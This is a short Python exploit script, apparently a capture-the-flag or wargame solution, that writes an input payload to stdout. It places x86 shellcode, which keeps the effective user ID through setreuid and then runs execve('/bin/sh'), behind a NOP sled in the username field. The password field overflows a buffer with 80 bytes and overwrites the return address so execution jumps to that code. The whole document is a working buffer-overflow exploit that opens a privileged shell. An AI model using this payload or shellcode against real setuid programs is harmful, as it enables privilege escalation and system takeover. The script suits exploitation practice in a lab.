import struct
import sys

A_USER_NAME = 0x0804a040
RET_ADDR = A_USER_NAME + 20
OFFSET = 80

shellcode = (
    "\x31\xc0\xb0\x31\xcd\x80"      # geteuid()
    "\x89\xc3\x89\xc1"              # ebx = eax, ecx = eax
    "\x31\xc0\xb0\x46\xcd\x80"      # setreuid(euid, euid)
    "\x31\xc0\x50"                  # push NULL
    "\x68\x2f\x2f\x73\x68"          # push //sh
    "\x68\x2f\x62\x69\x6e"          # push /bin
    "\x89\xe3\x50\x53\x89\xe1"      # ebx="/bin//sh", argv
    "\x99\xb0\x0b\xcd\x80"          # execve("/bin/sh", argv, NULL)
)

username = "dat_wil" + "\x90" * 100 + shellcode
password = "A" * OFFSET + struct.pack("<I", RET_ADDR)

payload = username + "\n" + password + "\n"

sys.stdout.write(payload)



